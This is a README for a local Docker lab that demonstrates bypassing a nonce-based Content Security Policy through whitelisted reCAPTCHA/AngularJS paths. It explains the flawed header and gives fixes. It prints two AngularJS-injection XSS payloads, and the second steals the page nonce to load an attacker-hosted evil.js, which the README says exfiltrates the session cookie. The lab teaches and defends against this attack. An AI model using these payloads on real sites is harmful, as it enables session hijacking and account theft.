# CSP Bypass Lab

A small, self-contained lab that demonstrates two Content Security Policy bypass
techniques against a nonce-based CSP that also whitelists Google's reCAPTCHA
domains. The whitelisted path serves a full AngularJS build, which is enough to
turn an HTML injection into script execution.

## Layout

```
csp-lab/
├── victim-site/        # SecureBank portal (vulnerable), port 8181
│   ├── index.html
│   ├── app.py          # Flask app, sets the CSP header
│   └── Dockerfile
├── attacker-site/      # payload reference + evil.js host, port 9090
│   ├── index.html
│   ├── evil.js
│   ├── app.py
│   └── Dockerfile
├── docker-compose.yml
├── LAB_GUIDE.md        # step-by-step walkthrough
└── README.md
```

## Run

```bash
docker compose up --build
```

- Victim:   http://localhost:8181
- Attacker: http://localhost:9090

Stop with `docker compose down`.

## The vulnerability

The victim sends:

```
script-src 'nonce-<random>' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ 'unsafe-inline';
default-src 'self'; img-src * data:; style-src 'self' 'unsafe-inline';
```

Three problems combine:

1. The nonce has no `'strict-dynamic'`, so the source whitelist still applies.
2. The whitelisted reCAPTCHA path serves AngularJS, which can execute expressions
   from HTML attributes (`ng-on-error`, etc.).
3. The feedback form writes user input to `innerHTML` with no sanitization.

The page legitimately loads reCAPTCHA, so AngularJS is already present. An attacker
only needs to inject an element carrying an AngularJS directive.

## The two cases

Both payloads go in the Customer Feedback field on the victim page.

Case 1 — alert:

```html
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert("CSP BYPASSED - Simple Attack!")'>
```

Case 2 — steal the nonce, load attacker JS, exfiltrate the session cookie:

```html
<img src=x ng-on-error='
    doc=$event.target.ownerDocument;
    a=doc.defaultView.top.document.querySelector("[nonce]");
    b=doc.createElement("script");
    b.src="http://localhost:9090/evil.js";
    b.nonce=a.nonce;
    doc.body.appendChild(b)
'>
```

## Fixing it

- Add `'strict-dynamic'` to `script-src` so the whitelist is ignored.
- Don't whitelist domains that serve powerful libraries.
- Sanitize HTML injection sinks (e.g. DOMPurify) instead of writing raw `innerHTML`.

## Background

The technique mirrors disclosed CSP-bypass reports against sites that whitelisted
Google's reCAPTCHA/AngularJS paths. For authorized testing only.
